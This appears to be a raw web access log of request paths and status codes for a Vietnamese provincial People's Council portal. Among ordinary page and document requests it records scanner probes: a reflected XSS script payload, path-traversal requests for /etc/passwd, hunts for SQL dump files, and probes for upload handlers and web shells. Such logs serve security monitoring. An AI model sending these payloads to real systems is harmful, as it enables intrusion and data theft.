/hoidongnhandan/1231/29459/39541/Nghien-cuu---Trao-doi/AttachFiles/AttachFiles/31.+NQ+sua+doi+bo+sung+NQ+11+_+62+HDND131220180426.pdf,404
/audio/27712.mp3,404
/server/,404
/_layouts/cui.js,200
/portal/pages/Ban-Van-hoa-Xa-hoi.aspx,200
/hoidongnhandan/1231/29459/39407/Gioi-thieu/AttachFiles/tai-lieu-detail.aspx,404
/portal/pages/van-ban/https:/hdnd.namdinh.gov.vn/portal/pages/van-ban/v.aspx,400
/cgi-bin/nightled.cgi,404
/portal/_pageLayouts/two-cols-left/layout.css,200
/portal/_res/fonts/Roboto/roboto-v18-latin_vietnamese_latin-ext-regular.woff2,200
"/AttachFiles/38.+BC+phong,+chong+tham+nhung+6+thang+dau+nam+2019100620201049.pdf",200
/portal/Photos/2023-05-12/390c0af803f0778d20230511_152751.jpg,200
/audio/27981.mp3,404
/portal/LinkImage/2c8d9318ee102ddunnamed.jpg,200
/apple-touch-icon.png,404
/portal/Pages/default.aspx/test.ashx,200
"/redirect.php/""><script>alert(document.domain)</script>",400
/GallerySite/filesrc/fotoilan/388/middle/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd,400
"/AttachFiles/39.+BC+k.qua+thuc+hanh+tiet+kiem,+CLP+6+thang+dau+nam+2019100620201050.pdf",200
/portal/pages/photos,302
/Admin/Access/Setup/Default.aspx,404
/cgi-bin/awstats/awredir.pl,415
/chosen.php,404
/portal/Pages/2023-4-19/Dong-chi-Pho-Bi-thu-Thuong-truc-Tinh-uy-tiep-xuc-c61hgxb.aspx,200
/AttachFiles/van-ban-kinh-te.aspx,403
/portal/Pages/default.aspx/api/uploadfile.ashx,200
/admin/ajax/pages.php,404
/img/layouts/sidebar-toggler.png,200
/assets/backend/elfinder/elfinder-cke.html,404
/api/v2/cmdb/system/admin,404
/portal/Pages/default.aspx/ceshi.ashx,200
/portal/_res/fonts/Roboto/roboto-v18-latin_vietnamese_latin-ext-italic.woff2,200
"/AttachFiles/33.+BC+k.qua+t.hien+k.nghi+cua+dai+bieu+HDND+tinh+tai+ky+6,7100620201047.pdf",200
/portal/Pages/Gioi-thieu-chung.aspx,200
/portal/Photos/2023-10/fcfedec2a4cd61ddqh1.png,200
/db_backup.sql,404
/portal/pages/Hoat-dong-cua-HDND-tinh.aspx,200
/hoidongnhandan/1231/29459/39475/hdnd-qua-cac-thoi-ky/href='/AttachFiles/tai-lieu.aspx,404
/index.asp,415
/view-doccument-13-BC-HDND-58.html,404
/portal/Photos/2024-03/59a4b336ca88b8dda1_20240307123759.jpg,200
/https:/hdnd.namdinh.gov.vn/portal/portal/pages/van-ban/default.aspx,400
/logfile,404
/Style+Library/en-US/Themable/Core+Styles/controls.css,404
/portal/_res/img/bg-patern-footer.png,200
/portal/Pages/2023-10-23/NANG-CAO-CHAT-LUONG-CONG-TAC-THAM-MUU-GIUP-VIEC-VAsivciz.aspx,200
/portal/Photos/2024-02/_t/6b6a7ce30fd9c71d1_20240220112335_jpg.jpg,200
/hoidongnhandan/1231/29459/40932/van-ban-tra-loi-y-kien---kien-nghi-cu-tri/tai-lieu-detail.aspx,404
/portal/LinkImage/1d81b253d19d58adDA7.jpg,200
/wizard/initialise.php,404
/portal/Photos/2023-01-19/99989deda392571dIMG_2384.jpg,200
/cgi-bin/popen.cgi,404
"/hoidongnhandan/1231/29459/42080/hoi-dong-nhan-dan-huyen-nam-truc/AttachFiles/AttachFiles/5.+NQ+ve+quyet+dinh+chu+truong+dau+tu+du+an+xay+dung+KDC+tap+trung+phia+Bac+thon+An+Loc+Thuong,+xa+Yen+Hong,+huyen+Y+Yen260420210411.pdf",400
/WebResource.axd,200
/cgi-bin/slogin/login.py,404
/api/v1/method.callAnon/sendForgotPasswordEmail,404
/portal/Pages/2023-5-12/Dai-hoi-Cong-doan-Van-phong-Doan-DBQH-va-HDND-tinhsm6bs9.aspx,200
/horde/admin/user.php,404
/portal/Pages/2024-3-27/Hoi-nghi-toan-quoc-tong-ket-cong-tac-HDND-cac-tinht9cojv.aspx,200
/configWizard/keyUpload.jsp,404
/_layouts/1033/init.js,200
/client/index.php,404
/AttachFiles/25.+QD+muc+ho+tro+kp+tu+NSNN+va+cac+khoan+dong+gop+dv+nguoi+tu+nguyen+cai+nghien+MT020720190208.pdf,404
/_LAYOUTS/TanDan/UploadControler.ashx,200
/portal/Photos/2023-04-21/8901b0cad1ca9ced3.jpg,200
/audio/28053.mp3,404
/hoidongnhandan/1231/29461/39412/95501/Tin-tuc---Hoat-dong/Hoi-nghi-lien-tich-thong-nhat-noi-dung-ky-hop-thu-nam-Hoi-dong-nhan-dan-tinh-khoa-XVIII.aspx,404
/admin/elfinder/elfinder-cke.html,404
/network_test.php,404
/audio/28081.mp3,404
/portal/Pages/2023-7-11/Ban-Van-hoa--Xa-hoi-HDND-tinh-tham-tra-truoc-ky-hor8ud8t.aspx,200
/api/2eGZrlspR5oJDSTECVv0dW1ZfMt,404
/portal/Pages/default.aspx/Admin/Uploadify,200
/portal/Photos/2023-12/fc3b9dee9dc9cf1d10+(2).jpg,200
/portal/Pages/default.aspx/tools/Uploadhandler.ashx,200
/audio/27461.mp3,404
/AttachFiles/CV+số+322+của+UBTVQH14+về+tham+khảo+lấy+fieu+tin+nhiệm+(1)181020180315150620200231.pdf,200
/hoidongnhandan/1231/29459/42083/Hoi-dong-nhan-dan-huyen-Hai-Hau/,404
/AttachFiles/nghi-quyet.aspx,403
/portal/Photos/2023-01/dd1af49d044c8efdIMG_2384.jpg,200
/elFinder/php/connector.minimal.php,404
/portal/Pages/Cac-ban-HDND-tinh.aspx,200
/portal/Pages/2023-9-2/Tuyen-ngon-doc-lap--ket-tinh-nhung-gia-tri-van-hoap3zcft.aspx,200
/2eGZrcYCuUDCgqedlgws7Nx4MGA.jsp,404
"/AttachFiles/38.+BC+cua+UBND+tinh+ve+ket+qua+thuc+hanh+tiet+kiem,+chong+lang+phi+nam+2020031220200927.pdf",304
/AttachFiles/21.+QH+chung+rang+dong280620180909.pdf,304
/linuxki/experimental/vis/kivis.php,404
/portal/Pages/default.aspx/Manage/Uploadhandler,200
/backup-mysql.sql,404
/portal/Pages/default.aspx/api/upfile.ashx,200
/portal/Pages/default.aspx/Admin/Uploadhandler,200
/portal/LinkImage/a4476add1fdc5eadChinhPhu-2.jpg,200
/portal/_res/img/tangtuongphan.png,200
/v1/2eGZrftKq4IatbQGC7INQDq1jpg.php,404
/audio/27934.mp3,404
/portal/Pages/van-ban/https:/hdnd.namdinh.gov.vn/portal/pages/van-ban/v.aspx,400
/portal/Pages/default.aspx/tools/Uploadhandler/Uploadhandler.ashx,200
/AttachFiles/hd+tổ+chức+kỳ+họp+thường+lệ+hĐnd+huyện030620180639.doc,200
/js/form/layouts.custom.js,200
/_layouts/tandan.portal/weather/img/48/02d.png,200
/index_sso.php,404
/_layouts/tandan.portal/weather/img/128/10n.png,200
/js/form/jquery.ui.min.js,200
/hoidongnhandan/1231/29459/42080/hoi-dong-nhan-dan-huyen-nam-truc/tai-lieu-detail.aspx,404
/portal/Pages/van-ban/https:/hdnd.namdinh.gov.vn/portal/portal/pages/van-ban/default.aspx,400
/admin/uploads.php,404
/portal/Photos/2024-01/_t/91e81f2d5c3ea6fd1_20240130182954_png.jpg,200
/van-ban-van-hoa.aspx,404
/hoidongnhandan/1231/29459/44416/Ky-hop-thu-nam/AttachFiles/nghi-quyet.aspx,404
/audio/27740.mp3,404
/portal/Pages/2022-10-28/Giam-sat-viec-thuc-hien-cac-chuong-trinh-tin-dung-73wamu.aspx,200
/hoidongnhandan/1231/29461/39414/79587/Ban-Van-hoa---Xa-hoi-HDND-tinh/Ban-Van-hoa---Xa-hoi-HDND-tinh--tham-tra-De-an-dat--doi-ten-duong--pho-va-cong-trinh-cong-cong-TP-Nam-Dinh-Trinh-Ky-hop-thu-hai---HDND-tinh-khoa-XVIII--nhiem-ky-2016---2021.aspx,403
/js/layouts/app.js,200
/portal/Photos/2024-01/f960ed21dd670a7d1_20240119144606.png,200
/cgi-bin/masterCGI,404
/mysql_dump.sql,404
/dfsms/add-category.php,404
/portal/_res/img/bg-shadow.png,200
/portal/_themes/Portal_red/img/tags.png,200
/Style+Library/en-US/Core+Styles/page-layouts-21.css,404
/AttachFiles/qĐ+thành+lập+Đoàn+giam+sat+chuyen+de+ve+khcn1030620180631.doc,200
"/AttachFiles/18.+BC+k.qua+cong+tac+phong,+chong+toi+pham+va+vi+pham+PL+2019100620201110.pdf",304
/portal/pages/photos/default.aspx,200
/audio/27939.mp3,404
/hoidongnhandan/1231/29459/42080/hoi-dong-nhan-dan-huyen-nam-truc/AttachFiles/nghi-quyet-detail.aspx,404
/backups.sql,404
/portal/Photos/2023-12/bf654a61cd7d5dcd960_20231222221109.png,200
/portal/Pages/2024-3-14/HDND-tinh-to-chuc-ky-hop-giai-quyet-cong-viec-phat9euq2a.aspx,200
/portal/js/jquery.tandan.bar-chart.js,200
/mims/updatecustomer.php,404
/portal/Pages/2022-6-25/Doan-giam-sat-cua-Thuong-truc-HDND-tinh-hop-thong-9mu35z.aspx,200
/api/v1/login/oauth2/auth,404
/_layouts/spgridview.js,200
/export/mysql.sql,404
/portal/_res_bak/img/print.png,404
/audio/27559.mp3,404
/portal/Pages/default.aspx/api/fileupload.ashx,200
/portal/Pages/2021-9-30/Hoi-nghi-tong-ket-va-ky-ket-Quy-che-phoi-hop-cong-jbt3au.aspx,200
/SamlResponseServlet,404
/AttachFiles/05-NQ-HĐND100620201149.pdf,304
"/AttachFiles/NQ+54+phu+cap+Thon+doi+truong,+muc+tro+cap+ngay+cong+lao+dong+doi+voi+dan+quan+khi+thuc+hien+nhiem+vu151220200251.pdf",200
/AdminTools/querybuilder/logon,404
/portal/Pages/default.aspx/files.ashx,200
/portal/_themes/Portal_red/img/ic-search.png,200
/config/getuser,404
/portal/Pages/2023-12-10/feqb9q.aspx,200
/RestAPI/Connection,404
/flash/addcrypted2,404
/tai-lieu-detail.aspx,404
/js/form/jscrollpane.min.js,200
/wp-content/themes/wpclassic/inc/index.php,404
/portal/Photos/2023-05/_t/80b42ddfe5d2c0d11e2130191db4f8516ca_jpg.jpg,200
/portal/Photos/2024-03/_t/59a4b336ca88b8dda1_20240307123759_jpg.jpg,200
/portal/Photos/2023-06/6256a234de4e5c0duntitled-2_20230619143248.jpg,200
/portal/_res/img/ic-media-item.svg,200
/help/english/index.html,404
/portal/Photos/2023-09/73eac09334699e0da1_20230906182448.jpg,200
/sap/public/bc/ur/Login/assets/corbu/sap_logo.png,404
/wp-admin/dropdown.php,404
/x,404
/portal/Photos/2021-10-17/5a5fe1f7d1fc4a4ddtg.jpg,200
/_layouts/styles/dlgframe.css,200
/ads.txt,404
/CookieAuth.dll,404
/homeaction.php,404
/portal/Pages/2021-10-31/Doan-dai-bieu-Quoc-hoi-tinh-dong-gop-y-kien-tai-ca0vp588.aspx,200
/hms/user-login.php,404
/wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php,404
/audio/27921.mp3,404
"/view-resol-Nghi-quyet-so-1-NQ-TTHDND-ngay-16-6-2016-ve-viec-xac-nhan-ket-qua-bau-cu-chu-tich-HDND-tinh-khoa-XVIII,-nhiem-vu-2016-2021-173.html",400
/https:/hdnd.namdinh.gov.vn/portal/pages/van-ban/default.aspx,400
/servlets/OmaDsServlet,404
/hoidongnhandan/1231/29459/42085/Hoi-dong-nhan-dan-huyen-Giao-Thuy/AttachFiles/NQ+20+quyet+dinh+dieu+chinh+c.truong+dau+tu+DA+phat+trien+ha+tang+khung+CP+dien+tu+tinh+ND100620201154.pdf,404
/hoidongnhandan/1231/29459/39413/Ban-Kinh-te---Ngan-sach-HDND-tinh/AttachFiles/thuong-truc.aspx,404
/wp-content/plugins/quiz-master-next/README.md,404
/AttachFiles/29.+Cac+BC+cua+Ban+Phap+che060620180941.pdf,200
/portal/Pages/default.aspx/api/Upload,200
/portal/Pages/2023-12-18/Ban-Thuong-vu-Tinh-uy-thao-luan-cho-y-kien-vao-cac8sjbqv.aspx,200
/css/form/jquery.tagsinput.css,200
/portal/VanBan/2023-04/cf21e26dd7f9fc8dThông+báo+kết+quả+kỳ+họp+thứ+10+HĐND+tỉnh.pdf,200
/AttachFiles/ban+pc.báo+cáo+thẩm+tra+(chính+thức)+(1)030620180636.doc,200
"/AttachFiles/23.+Đ.án+thu+phí+cấp+GCN+KD+cơ+sở,+CLB+về+thể+thao100620201138.pdf",200
/scripts/setup.php,404
/portal/Photos/2024-03-13/cfd864bb1d4874fdscreenshot-1710296531035.png,200
/van-phong-detail.aspx,404
/portal/Pages/van-ban/https:/hdnd.namdinh.gov.vn/portal/pages/van-ban/default.aspx,400
/console/login/LoginForm.jsp,404
/AttachFiles/23.+BC+cong+tac+nam+2019+cua+Cuc+thi+hanh+an+100620201112.pdf,200
/index.php,404
/hoidongnhandan/1231/29461/39412/95503/Tin-tuc---Hoat-dong/Hoi-nghi-Thuong-truc-HDND-cac-tinh--thanh-pho-Dong-bang-song-Hong-va-duyen-hai-Bac-Bo-tai-Ha-Noi.aspx,404
/backend/elfinder/elfinder-cke.html,404
/css/form/bootstrap.datepicker.css,200
/portal/admin/tai-nguyen/js/van-ban.js,200
/portal/Photos/2023-07/3faea2dd230b0fed357172196e3abd64e42b.jpg,200
/wp-admin/admin-post.php,404
"/site/thuvientailieudientuvietnam/AttachFiles/NQ+52+giao+bien+che+cong+chuc+QLHCNN+va+phe+duyet+tong+so+nguoi+lam+viec+trong+don+vi+SNCL,+to+chuc+hoi,+giao+vien+mam+non+HD151220200249.pdf",400
/audio/27842.mp3,404
/CTCWebService/CTCWebServiceBean/ConfigServlet,404
/AttachFiles/34.1.+BC+cua+UBND+tinh+ve+ket+qua+thuc+hien+sau+GSCD+cua+TT+HDND+tinh+ve+tinh+hinh+hoat+dong+cua+cong+ty+MTV+khai+thac+cong+trinh+thuy+loi031220200923.pdf,200
/STATE_ID/123/agentLogUploader,404
/apple-touch-icon-152x152-precomposed.png,404
/css/form/jquery.jgrowl.css,200
/portal/Pages/2022-11-21/Hoi-nghi-lan-thu-17-Ban-Chap-hanh-Dang-bo-tinh-kholeykot.aspx,200
/OASREST/v2/authenticate,404
/hoidongnhandan/1231/29459/40963/Chuong-trinh-hanh-dong-DB-HDND/AttachFiles/NQ+83+chap+thuan+dieu+chinh+thoi+gian+thuc+hien+du+an+xay+dung+kho+luu+tru+chuyen+dung+tinh151220200310.pdf,404
/portal/Pages/default.aspx/ceshi.asp,200
/ztp/cgi-bin/handler,404
/dms/admin/accounts/payment_history.php,404
/AttachFiles/NQ+80+chap+thuan+dieu+chinh+du+an+xay+dung+KDT+moi+phia+Nam+song+Dao151220200308.pdf,200
/xmlrpc,404
/wp-content/style.php,404
/AttachFiles/Báo+cáo+thẩm+tra+(chính+thức).doc130320180939.docx,304
/portal/pages/Tin-hoat-dong-HDND-cac-huyen-TP.aspx,200
/portal/Pages/2021-10-19/Giam-sat-viec-thuc-hien-chinh-sach-phap-luat-ve-trptz6ln.aspx,200
/wp-content/plugins/documentor-lite/core/js/documentor.js,404
/_layouts/tandan.portal/jslibs/jquery.js,200
/wp-includes/style.php,404
/admin.html,404
/portal/Pages/Ban-Phap-Che.aspx,200
/zimbraAdmin/0MVzAe6pgwe5go1D.jsp,404
/portal/LinkImage/ed4b073d7df5b2fdda+cam.jpg,200
/portal/Photos/2024-03/bac4b5956eafe91dqh_20240325212544.png,200
/portal/VanBan/2023-08/dbfbb64637e5f52dQuyết+định+triệu+tập+kỳ+họp+thứ+13+HĐND+tỉnh.pdf,200
/audio/27611.mp3,404
/portal/ImageAds/c7d149d0d51cdccdNghiQuyetDB.jpg,200
/api/graphql,404
/pme/media/,404
/_layouts/1033/core.js,200
/include/makecvs.php,404
/portal/js/font-zoom.js,200
/hoidongnhandan/1231/29461/39412/99593/Tin-tuc---Hoat-dong/Dang-huong-tuong-niem-111-nam-Ngay-sinh-Tong-Bi-thu-Truong-Chinh.aspx,404
/wp-content/themes/applica/400.php,404
/portal/Photos/2021-10-19/5d98965349446d1dvhxh1.jpg,200
/portal/Photos/2022-08-19/eeddedd3e45c260dimages1343578_Untitled_1.jpg,200
/webmail/,404
"/portal/VanBan/2021-11/2d283ae22207240d26.+Sap+xep,+sap+nhap+thon+(xom),+to+dan+pho+tren+dia+ban+tinh,+giai+doan+2021_2022.pdf",200
/portal/Pages/2023-8-25/Dau-an-nua-nhiem-ky-Hoi-dong-nhan-dan-cac-capccipc8.aspx,200
/portal/Pages/default.aspx/tools/Uploadhandler/Uploadify.ashx,200
/portal/pages/Tin-hoat-dong-Van-phong-Doan-DBQH-va-HDND.aspx,200
/wp-content/plugins/Cache/Cache.php,404
/AttachFiles/27.+BC+GSCD+cua+TT+HDND+tỉnh+ve+t.+hinh+h.dong+cua+cac+c.so+GDPTCL+tren+dia+ban+tinh100620201113.pdf,304
"/AttachFiles/4.+Sap+xep+don+vi+hanh+chinh+cap+huyen,+xã+giai+doan+2019-2021100620201100.pdf",206
/cgi-bin/export-cgi,404
/portal/Pages/2023-11-14/Dai-bieu-HDND-tinh-tiep-tuc-chuong-trinh-tiep-xuc-ncs8qk.aspx,200
/portal/admin/tai-nguyen/js/album.js,200
/portal/admin/default.aspx,200
/css/form/style.css,200
/ebook/bookPerPub.php,404
/portal/Photos/2023-12-25/12d7ea91528f3f0d2a.jpg,200
/card_scan.php,404
/audio/27926.mp3,404
/portal/Photos/2022-10-28/d419b4d68d61d4fdPXL_20221026_082107133.jpg,200
/portal/Photos/2022-11/79a3ed92da2316fdimages1345836_Untitled_1.jpg,200
/hoidongnhandan/1231/29459/39511/lich-cong-tac/tin-tuc-van-hoa.aspx,404
/wp-includes/js/tinymce/skins/lightgray/img/index.php,404
/_layouts/images/wpmenuarrow.png,200
/AttachFiles/kế+hoạch+giám+sát+chuyên+đề030620180608.doc,200
/portal/Photos/2022-06-30/8e0c0acbfd7189bdIMG_1656560362096_1656575143740.jpg,200
/portal/Pages/2023-8-22/Tuyen-duong-khen-thuong-con-CBCC-NLD-ve-thanh-tichdyk1i7.aspx,200
/portal/Pages/2021-3-25/Tao-dieu-kien-de-ung-cu-vien-lang-nghe-y-kien-cu-td2xfqc.aspx,200
/nghi-quyet-detail.aspx,404
/portal/_themes/Portal_red/jquery-ui/jquery-ui.min.css,200
/AttachFiles/nghị+quyết+24+của+TT+HĐND120620200831.pdf,200
/portal/VanBan/2021-12/86c6414a686418cd8.+60.+NQ+chap+thuan+du+an+phai+thu+hoi+dat+2020.pdf,200
/functionRouter,404
/hoidongnhandan/1231/29461/40932/80173/Van-ban-tra-loi-y-kien---kien-nghi-cu-tri/Bao-cao-so-164-BC-SNN-ngay-01-7-2016-cua-So-Nong-nghiep-va-Phat-trien-nong-thon-tra-loi-y-kien-kien-nghi-cua-cu-tri-tai-ky-hop-thu-16--HDND-tinh-khoa-XVII.aspx,403
/portal/LinkImage/bdd19138618d6dcdGopYVB-r.jpg,200
/_layouts/1033/styles/Themable/layouts.css,200
/portal/Photos/2024-03/a90d36d104e3d40d1_20240318180913.png,200
/db_dump.sql,404
/wp-content/uploads/cfom_files/2egzrb5ymxugydiur6jfpb9l56y.php,404
/wp-content/themes/universal-news/www.php,404
/portal/Pages/2023-10-12/Hoi-nghi-lan-thu-24-Ban-Chap-hanh-Dang-bo-tinh-khou5krs7.aspx,200
/portal/Photos/2024-01/_t/e46c3d0094bfd45d1_jpg.jpg,200
/geoserver/wms,404
/vendor/htmlawed/htmlawed/htmLawedTest.php,404
/js/jquery_file_upload/server/php/,404
/,302
/portal/Pages/Thuong-truc-HDND-tinh.aspx,200
/_layouts/tandan/img/no-avatar.jpg,200
/portal/pages/van-ban/https:/namdinh.gov.vn/portal/pages/van-ban/default.aspx,400
/audio/27879.mp3,404
/portal/_themes/Portal_red/img/chuoi.png,200
/_forms/default.aspx,200
/portal/VanBan/2021-11/28456a60436d222d34.2.+BC+ket+qua+giam+sat+chuyen+de+viec+t.hien+CSPL+ve+tro+giup+xã+hoi+tu+nam+2019+den+nay+(cua+Ban+VHXH).pdf,304
/Side.php,404
/portal/Pages/Doan-DBQH-tinh.aspx,200
/portal/Photos/2021-10-17/4a1a9626207f4dadbtk.jpg,200
/img/layouts/logo.png,200
/css/form/tandan.datatables.css,200
/portal/js/portal.app.js,200
/href='/tai-lieu-detail.aspx,404
/portal/_res/css/responsive.css,200
/hoidongnhandan/1231/29459/39471/so-do-site/ban-phap-che.aspx,404
/audio/27471.mp3,404
/AttachFiles/33.+BC+Ctác+ANTT+của+CA100620201140.pdf,304
/admin/dashboard.php,404
/_layouts/images/errorIcon.png,200
/van-ban-view.aspx,404
"/AttachFiles/30.+B.cao+phong,+chong+toi+pham+va+vi+pham+phap+luat+6+thang+dau+nam+cua+UBND+tinh140720210818.pdf",304
/portal/Pages/2021-10-13/Phong-Cong-tac-Hoi-dong-nhan-dan0h5603.aspx,200
/js/layouts/jquery-1.8.3.min.js,200
/jira/secure/BrowseProject.jspa,404
/alfa-rex.php7,404
/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php,404
/hoidongnhandan/1231/29459/39415/Ban-Phap-che-HDND-tinh/tai-lieu-detail.aspx,404
/AttachFiles/9.+Bao+cao+tham+tra+cua+Ban+KTNS220420210941.pdf,200
/actuator/gateway/routes/2eGZrkSZLx5hTKDyLRLIcyDsZ4b,302
/hoidongnhandan/1231/29459/39541/Nghien-cuu---Trao-doi/,404
"/hoidongnhandan/1231/29459/39413/Ban-Kinh-te---Ngan-sach-HDND-tinh/AttachFiles/NQ+62+thong+qua+cap+nhat+thay+doi+ve+quy+mo,+dia+diem+va+so+luong+cong+trinh,+du+an+dat+quoc+phong+trong+dieu+chinh+QH+SDD151220200257.pdf",400
/AttachFiles/07.+NQ+muc+chi+va+thoi+gian+huong+ho+tro+phuc+vu+cong+tac+bai+cu+DBQH+va+DB+HDND+cac+cap+nhiem+ky+2021-2026220320211007.pdf,304
"/portal/VanBan/2024-03/4f070a03d7118e7dNghị+quyết+kỳ+họp+16+HĐND+tỉnh+khóa+XIX,+NK+2021-2026.rar",200
/portal/Photos/2023-01/37ae89186d3d23ddmt4.jpg,200
/src/redirect.php,404
/portal/Pages/2023-9-28/Doan-dai-bieu-Quoc-hoi-tinh-tiep-xuc-cu-tri-truoc-shazz3.aspx,200
/portal/_res/css/img/ic-title.png,200
/portal/Photos/2023-01-19/d13d4ec91cf0dacdIMG_2383.jpg,200
/meaweb/os/mxperson,404
/portal/images/icon.gif,200
/portal/Pages/2021-10-13/Lanh-dao-Van-phong-Doan-DBQH-va-HDND-tinh-Nam-Dinha10e1d.aspx,200
/audio/27494.mp3,404
/portal/Photos/2023-11/32d9051192338a6d1_20231125143917.jpg,200
/AttachFiles/NGHỊ+QUYẾT+28+CỦA+TT+HĐND120620200751.pdf,200
/portal/VanBan/2021-11/78840cf0add4f07d32.2.1.+Phu+luc+kem+theo+BC+GSCD+cua+Ban+KTNS+(PL+01).pdf,200
/wp-content/plugins/canto/includes/lib/get.php,404
/userfiles/file/TaiLieuTXCT+Ky+hop+6/AttachFiles/8-+NQ+76+ve+phi+thu+vien120620200950.doc,404
/api/scrape/kube-system,404
/checkValid,404
/_layouts/inplview.js,200
/js/form/bbq.js,200
/portal/Photos/2024-03-25/6ad777a1dd1d55ad3.jpg,200
/van-ban-thuong-truc.aspx,404
/assets/elFinder/elfinder.html,404
/dai-bieu-detail.aspx,404
/portal/Pages/default.aspx/Content/Uploadify,200
/AttachFiles/8.+BC+c.tac+nam+2018+cua+Cuc+THA011220181004.pdf,200
/portal/Photos/2023-05/a858a3cff78b889danh1_20230511175107.jpg,200
/portal/Pages/default.aspx/up.ashx,200
/portal/Photos/2023-02/dca5e5850d96807d1_20230221105815.png,200
/js/layouts/tandan.exporter.js,200
/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd#foo/development,400
/ajax/openvpn/del_ovpncfg.php,404
